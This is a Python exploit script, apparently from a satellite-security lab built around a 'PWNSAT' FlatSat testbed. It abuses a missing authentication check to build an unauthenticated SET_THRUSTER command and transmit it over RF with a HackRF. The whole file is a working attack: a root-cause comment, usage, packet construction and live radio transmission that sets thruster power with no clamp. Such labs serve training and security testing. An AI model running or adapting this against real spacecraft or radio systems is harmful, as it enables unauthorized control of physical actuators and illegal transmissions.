#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# 03_command_injection_rf.py -- unauthenticated SET_THRUSTER.
#
# Root cause: groundStationCommandAllowed() returns true for every APID
# while groundStationModeEnabled is false (its default). SET_THRUSTER reads
# data[0] as thruster ID and data[1] as raw power (0-255, no clamp) and
# writes it straight to the actuator. The command works as intended -- the
# bug is that nobody checks who is allowed to call it.
#
# Usage:
#   ./03_command_injection.py --thruster-id 0 --power 255
#
# Expected: FlatSat serial console shows "Thruster 0 changed to: 255"
# immediately (no auth); PWNSAT-C3's Thruster gauge jumps.

import argparse
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "lib"))

from pwnsat_packets import build_command_packet  # noqa: E402

from require_gnuradio import check as _check_gnuradio  # noqa: E402
_check_gnuradio()

from pwnsat_lora_tx import UPLINK_FREQ_HZ, transmit_packet  # noqa: E402


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--thruster-id", type=int, choices=[0, 1], default=0,
                        help="which thruster to command (0 or 1)")
    parser.add_argument("--power", type=int, default=200, metavar="0-255",
                        help="raw power value, no clamp on the firmware side")
    parser.add_argument("--seq", type=int, default=1, help="SPP sequence count")
    parser.add_argument("--encrypt", choices=["on", "off"], default="on")
    parser.add_argument("--device-args", default="hackrf", help="SoapySDR driver, e.g. 'hackrf'")
    parser.add_argument("--gain", type=int, default=20, help="HackRF TX (VGA) gain, dB")
    parser.add_argument("--frequency", type=int, default=UPLINK_FREQ_HZ, help="Hz")
    parser.add_argument("--quiet", action="store_true",
                        help="hide hackrf_transfer's own output (shown by default as "
                             "visible proof this is a real RF transmission, not just "
                             "this script's own print statements)")
    args = parser.parse_args()

    if not 0 <= args.power <= 255:
        parser.error("--power must be 0-255")

    raw_spp = build_command_packet(
        "thruster", seq=args.seq, encrypt=(args.encrypt == "on"),
        thruster_id=args.thruster_id, power=args.power,
    )

    print(f"[*] SET_THRUSTER packet ({'encrypted' if args.encrypt == 'on' else 'cleartext'}, "
          f"seq={args.seq}): {raw_spp.hex()}")
    print(f"[*] thruster_id={args.thruster_id}  power={args.power} -- no authentication required")
    print(f"[*] Transmitting on {args.frequency / 1e6:.3f} MHz via {args.device_args} "
          f"(gain={args.gain} dB)...")

    transmit_packet(raw_spp, frequency=args.frequency, device_args=args.device_args,
                    verbose=not args.quiet,
                    tx_gain=args.gain)

    print(f"[+] Sent. Check the FlatSat's serial console (\"Thruster {args.thruster_id} "
          f"changed to: {args.power}\") and PWNSAT-C3's Thruster gauge.")


if __name__ == "__main__":
    main()
